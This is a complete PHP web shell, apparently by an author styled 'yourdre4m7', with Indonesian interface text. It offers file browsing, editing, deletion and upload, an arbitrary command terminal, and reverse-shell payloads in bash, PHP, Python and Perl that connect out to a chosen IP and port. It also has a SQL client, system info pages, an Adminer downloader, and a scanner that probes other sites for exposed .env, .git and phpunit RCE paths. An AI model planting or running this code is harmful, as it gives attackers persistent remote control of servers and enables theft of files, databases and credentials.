<?php
session_start();
$whitelist = ['114.10.95.250']; 
$ip = $_SERVER['REMOTE_ADDR'];
if (!in_array($ip, $whitelist)) {
    header('HTTP/1.1 403 Forbidden');
    die("
<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
    <style>
        body {
            background-color: black;
            color:rgb(255, 0, 0);
            font-family: monospace;
            text-align: center;
            padding: 50px;
        }
        img {
            width: 150px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 0 10pxrgb(255, 0, 0);
        }
        .ascii {
            white-space: pre;
            font-size: 14px;
        }
        .footer {
            margin-top: 20px;
            color: gray;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <img src='https://phoneky.co.uk/thumbs/screensavers/down/fantasy/blinkyeyes_5tn31ysn.gif' width='250px' height='250px' />
    <p style='margin-top:20px;font-size:18px;'>403 Access Denied - Your IP Not Whitelist</p>
    <p>Cie... Mau nykung akses ya? wkwk 🤭</p>
    <div class='footer'>- yourdre4m7 - </div>
</body>
</html>
");

}
function head($title = "WebShell") {
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>$title</title>
    <style>
        body { background: rgb(0, 0, 0); color: #eee; font-family: monospace; padding: 20px; }
        .menu { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        a, input[type=submit] {
            background: #222; color: #fff; border: 1px solid #444;
            padding: 8px 12px; border-radius: 5px; text-decoration: none;
        }
        a:hover, input[type=submit]:hover { background: #333; }
        input[type=text], textarea {
            background: #1e1e1e; color: #fff; border: 1px solid #444;
            padding: 8px; width: 100%; max-width: 600px;
        }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; border-bottom: 1px solid #333; text-align: left; }
        th { background: #222; }
        pre { background: #1e1e1e; padding: 10px; border-radius: 5px; white-space: pre-wrap; }
    </style>
</head>
<body>
HTML;
}

function footer() {
    echo "<center><hr><small>Your IP : {$_SERVER['REMOTE_ADDR']} | Host : ".gethostname()." | ".date("Y-m-d H:i:s")."</small></body></html></center><center><small>>> Author by : yourdre4m7 <<<br>>> Github : github.com/ItsMeAlf404 <<</center></br></small>";
}

if (isset($_GET['fm'])) {
    head("File Manager");
    $path = isset($_GET['path']) ? $_GET['path'] : '.';
    $real = realpath($path);
    if (!is_dir($real)) {
        echo "<p>Invalid path</p>"; footer(); exit;
    }

    echo "<h2>📁 File Manager: $real</h2>";
    echo "<table><tr><th>Type</th><th>Name</th><th>Size</th><th>Modified</th><th>Action</th></tr>";

    foreach (scandir($real) as $f) {
        if ($f === ".") continue;
        $full = $real . DIRECTORY_SEPARATOR . $f;
        $type = is_dir($full) ? "DIR" : "FILE";
        $size = is_file($full) ? filesize($full) . " B" : "-";
        $time = date("Y-m-d H:i", filemtime($full));
        $enc = urlencode($full);

        echo "<tr><td>$type</td><td>";
        echo $type === "DIR" ? "<a href='?fm=1&path=$enc'>$f</a>" : htmlspecialchars($f);
        echo "</td><td>$size</td><td>$time</td><td>";
        if ($type === "FILE") {
            echo "<a href='?dl=$enc'>Download</a> ";
            echo "<a href='?edit=$enc'>Edit</a> ";
            echo "<a href='?del=$enc' onclick=\"return confirm('Delete?')\">Delete</a>";
        } else {
            echo "<a href='?fm=1&path=$enc'>Open</a>";
        }
        echo "</td></tr>";
    }

    echo "</table><br><a href='?'>BACK TO MENU</a>"; footer(); exit;
}

// === DOWNLOAD FILE === //
if (isset($_GET['dl']) && file_exists($_GET['dl'])) {
    $f = $_GET['dl'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($f).'"');
    readfile($f); exit;
}

// === DELETE FILE === //
if (isset($_GET['del']) && file_exists($_GET['del'])) {
    unlink($_GET['del']);
    header("Location: ?fm=1"); exit;
}

// === EDIT FILE === //
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $file = $_GET['edit'];
    head("Edit File");
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        echo "<p>✅ File disimpan!</p>";
    }
    $content = htmlspecialchars(file_get_contents($file));
    echo "<h2>📝 Edit: ".htmlspecialchars($file)."</h2>
    <form method='post'>
        <textarea name='content' rows='20'>$content</textarea><br>
        <input type='submit' value='Simpan'>
    </form>
    <a href='?fm=1'>BACK TO MENU</a>";
    footer(); exit;
}

// === PHP INFO VIEWER === //
if (isset($_GET['info'])) {
    head("PHP Info");
    echo "<h2>ℹ️ PHP Info</h2>";
    ob_start();
    phpinfo();
    $info = ob_get_clean();

    $info = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $info);
    $info = str_replace('<body>', '<div style="text-align:left;background:#1e1e1e;color:#eee;padding:20px;font-family:monospace;">', $info);
    $info = str_replace('</body>', '</div>', $info);
    echo $info;

    footer(); exit;
}

// === ADMINER === //
if (isset($_GET['adminer'])) {
    head("Adminer");
    echo "<h2>🧩 Adminer DB Manager</h2>
    <p>Silakan pilih versi Adminer yang ingin digunakan:</p>
    <ul>
        <li><a href='?adminer_dl'>➡️ Download & Jalankan Adminer (SQLite/MySQL)</a></li>
        <li><a href='?'>BACK TO MENU</a></li>
    </ul>";
    footer(); exit;
}

// === AUTO DOWNLOAD ADMINER === //
if (isset($_GET['adminer_dl'])) {
    $adminer_url = 'https://www.adminer.org/latest.php';
    $save_as = 'adminer.php';
    file_put_contents($save_as, file_get_contents($adminer_url));
    header("Location: $save_as");
    exit;
}
// === UPLOAD FILE === //
if (isset($_GET['up'])) {
    head("Upload File");
    echo "<h2>📤 Upload File</h2>
    <form method='post' enctype='multipart/form-data'>
        <input type='file' name='upload'><br><br>
        <input type='submit' value='Upload'>
    </form><a href='?'>BACK TO MENU</a>";
    footer(); exit;
}
if (isset($_FILES['upload'])) {
    $name = basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $name)) {
        echo "<p>✅ File $name berhasil diupload!</p>";
    } else {
        echo "<p>❌ Gagal upload.</p>";
    }
    echo "<a href='?'>BACK TO MENU</a>"; exit;
}

// === TERMINAL === //
if (isset($_GET['cmd'])) {
    head("Terminal");
    echo "<h2>💻 Terminal Command</h2>
    <form method='post'>
        <input type='text' name='command' placeholder='whoami'>
        <input type='submit' value='Jalankan'>
    </form>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
        $cmd = $_POST['command'];
        echo "<h3>📤 Perintah: <code>" . htmlspecialchars($cmd) . "</code></h3><pre>";

        if (function_exists("shell_exec") && !in_array("shell_exec", explode(',', ini_get("disable_functions")))) {
            echo shell_exec($cmd);
        } elseif (function_exists("system") && !in_array("system", explode(',', ini_get("disable_functions")))) {
            system($cmd);
        } elseif (function_exists("exec") && !in_array("exec", explode(',', ini_get("disable_functions")))) {
            exec($cmd, $output); echo implode("\n", $output);
        } elseif (function_exists("passthru") && !in_array("passthru", explode(',', ini_get("disable_functions")))) {
            passthru($cmd);
        } else {
            echo "⚠️ Semua fungsi eksekusi perintah dinonaktifkan di server ini.";
        }

        echo "</pre>";
    }

    echo "<a href='?'>BACK TO MENU</a>";
    footer(); exit;
}

// === BACKCONNECT === //
if (isset($_GET['backconnect'])) {
    head("Backconnect / Reverse Shell");
    echo "<h2>🔁 Reverse Shell</h2>
    <form method='post'>
        IP Target: <input type='text' name='ip' placeholder='ex: 192.168.1.10'><br><br>
        Port: <input type='text' name='port' placeholder='ex: 4444'><br><br>
        <label>Payload:</label><br>
        <select name='payload'>
            <option value='bash'>bash</option>
            <option value='php'>php</option>
            <option value='python'>python</option>
            <option value='perl'>perl</option>
        </select><br><br>
        <input type='submit' name='send' value='Connect Now'>
    </form>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $ip = $_POST['ip'];
        $port = $_POST['port'];
        $payload = $_POST['payload'];
        echo "<h3>🚀 Menjalankan reverse shell ke <code>$ip:$port</code></h3><pre>";

        $cmd = '';
        switch ($payload) {
            case 'bash':
                $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
                break;
            case 'php':
                $cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
                break;
            case 'python':
                $cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'";
                break;
            case 'perl':
                $cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
                break;
        }

        // Jalankan command (jika shell_exec tersedia)
        if (function_exists('shell_exec')) {
            shell_exec($cmd);
            echo "✅ Command dikirim. Coba lihat di listener Anda.";
        } else {
            echo "❌ shell_exec tidak tersedia di server ini.";
        }

        echo "</pre><a href='?'>BACK TO MENU</a>";
    }

    footer(); exit;
}

// === SYSTEM INFO ===
if (isset($_GET['sysinfo'])) {
    head("System Info");
    echo "<h2>🧠 System Info</h2><pre>";
    echo "Hostname: ".gethostname()."\n";
    echo "OS: ".php_uname()."\n";
    echo "PHP Version: ".phpversion()."\n";
    echo "Server Software: ".$_SERVER['SERVER_SOFTWARE']."\n";
    echo "Document Root: ".$_SERVER['DOCUMENT_ROOT']."\n";
    echo "Current User: ".get_current_user()."\n";
    echo "Disk Free: ".round(disk_free_space("." ) / 1024 / 1024, 2)." MB\n";
    echo "Disk Total: ".round(disk_total_space("." ) / 1024 / 1024, 2)." MB\n";
    echo "Uptime: ".@shell_exec('uptime')."\n";
    echo "</pre><a href='?'>BACK TO MENU</a>";
    footer();
    exit;
}

// === SQL MANAGER === //
if (isset($_GET['sqlmgr'])) {
    head("SQL Manager");
    echo "<h2>🧮 SQL Manager</h2>";

    if (!isset($_SESSION['sql_connected'])) {
        echo "<form method='post'>
        <input type='text' name='host' placeholder='Host (ex: localhost)'><br><br>
        <input type='text' name='user' placeholder='DB Username'><br><br>
        <input type='text' name='pass' placeholder='DB Password'><br><br>
        <input type='text' name='db' placeholder='Database Name'><br><br>
        <input type='submit' name='connect' value='Connect'>
        </form>";
        if (isset($_POST['connect'])) {
            $conn = @mysqli_connect($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
            if ($conn) {
                $_SESSION['sql_connected'] = true;
                $_SESSION['sql_host'] = $_POST['host'];
                $_SESSION['sql_user'] = $_POST['user'];
                $_SESSION['sql_pass'] = $_POST['pass'];
                $_SESSION['sql_db']   = $_POST['db'];
                echo "<p>✅ Connected to DB.</p><meta http-equiv='refresh' content='1;url=?sqlmgr'>";
            } else {
                echo "<p style='color:red;'>❌ Connection failed.</p>";
            }
        }
    } else {
        $conn = @mysqli_connect($_SESSION['sql_host'], $_SESSION['sql_user'], $_SESSION['sql_pass'], $_SESSION['sql_db']);
        if (!$conn) {
            unset($_SESSION['sql_connected']);
            echo "<p style='color:red;'>❌ Lost connection. Please reconnect.</p><a href='?sqlmgr'>Try Again</a>";
            footer(); exit;
        }

        echo "<form method='post'>
        <textarea name='query' rows='5' placeholder='SELECT * FROM users'></textarea><br>
        <input type='submit' name='run' value='Run Query'>
        <a href='?sqlmgr&logout=1'>🔌 Disconnect</a>
        </form>";

        if (isset($_GET['logout'])) {
            session_unset(); session_destroy();
            echo "<p>🔌 Disconnected.</p><meta http-equiv='refresh' content='1;url=?sqlmgr'>";
            footer(); exit;
        }

        if (isset($_POST['run']) && !empty($_POST['query'])) {
            $sql = $_POST['query'];
            echo "<h3>Query:</h3><pre>".htmlspecialchars($sql)."</pre>";
            $res = @mysqli_query($conn, $sql);
            if ($res === true) {
                echo "<p>✅ Query OK (no result)</p>";
            } elseif ($res) {
                echo "<table border=1 cellpadding=5><tr>";
                $fields = mysqli_fetch_fields($res);
                foreach ($fields as $f) echo "<th>{$f->name}</th>";
                echo "</tr>";
                while ($row = mysqli_fetch_assoc($res)) {
                    echo "<tr>";
                    foreach ($row as $v) echo "<td>".htmlspecialchars($v)."</td>";
                    echo "</tr>";
                }
                echo "</table>";
            } else {
                echo "<p style='color:red;'>❌ Error: ".mysqli_error($conn)."</p>";
            }
        }
    }
    echo "<a href='?'>BACK TO MENU</a>";
    footer(); exit;
}

// === Laravel Vulnerability Finder ===
if (isset($_GET['laravelfinder'])) {
    head("Laravel Vuln Finder");
    echo "<h2>🔍 Laravel Vuln Finder</h2>
    <form method='post'>
        <input type='text' name='target' placeholder='https://domain.com'>
        <input type='submit' value='Scan'>
    </form>";

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['target'])) {
        $url = rtrim($_POST['target'], '/');
        $checks = [
            '/.env' => ' Laravel .env',
            '/.git/config' => ' Git Exposed',
            '/vendor/composer/installed.json' => ' Composer Installed Packages',
            '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' => ' eval-stdin.php RCE',
            '/config/database.php' => ' Laravel DB Config',
        ];

        echo "<h3>Hasil Scan untuk <code>$url</code></h3><ul>";
        foreach ($checks as $path => $desc) {
            $test = @file_get_contents($url . $path, false, stream_context_create(['http' => ['timeout' => 5]]));
            if ($test !== false && strlen($test) > 10) {
                echo "<li style='color:lime;'>✅ $desc ditemukan di <code>$path</code></li>";
            } else {
                echo "<li style='color:gray;'>❌ $desc tidak ditemukan</li>";
            }
        }
        echo "</ul>";
    }

    echo "<a href='?'>BACK TO MENU</a>";
    footer();
    exit;
}

// === MENU UTAMA === //
head("FileManager");
echo "<center><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/544px-Google_2015_logo.svg.png alt='Logo' width='300'><img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/544px-Google_2015_logo.svg.png alt='Logo' width='300'><br></center>
<h2><center>>> Welcome <<</center></h2>
<div class='menu'>
    <a href='?fm=1'>📂 File Manager</a>
    <a href='?up'>📤 Upload File</a>
    <a href='?adminer'>🧩 Adminer</a>
    <a href='?cmd'>💻 Terminal</a>
    <a href='?backconnect'>🔁 Backconnect</a>
    <a href='?laravelfinder'>🧪 Laravel Vuln Finder</a>
    <a href='?sqlmgr'>🧮 SQL Manager</a>
    <a href='?info'>ℹ️ PHP Info</a>
    <a href='?sysinfo'>🧠 System Info</a>
</div>";

footer();
?>
